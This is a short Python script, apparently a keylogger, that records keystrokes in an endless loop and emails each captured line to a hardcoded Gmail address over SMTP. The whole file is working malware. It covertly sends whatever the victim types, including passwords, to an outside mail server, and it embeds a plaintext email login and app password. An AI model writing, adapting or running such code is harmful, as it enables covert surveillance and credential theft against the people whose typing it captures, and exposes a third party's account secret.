import keyboard as kb
import smtplib



while True:
    rec = kb.record(until="enter")
    seq = kb.get_typed_strings(rec)

    toaddrs = 'drio24650@gmail.com'
    fromaddrs = 'drio24650@gmail.com'
    message1 = "".join(seq)
    message = f"{message1}"

    with smtplib.SMTP('smtp.gmail.com', '587') as smtpserver:
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo()
        smtpserver.login('drio24650@gmail.com', 'jasz ywfw dsxl jwqo')
        smtpserver.sendmail(fromaddrs, toaddrs, message)
        print(message)

    print("".join(seq))

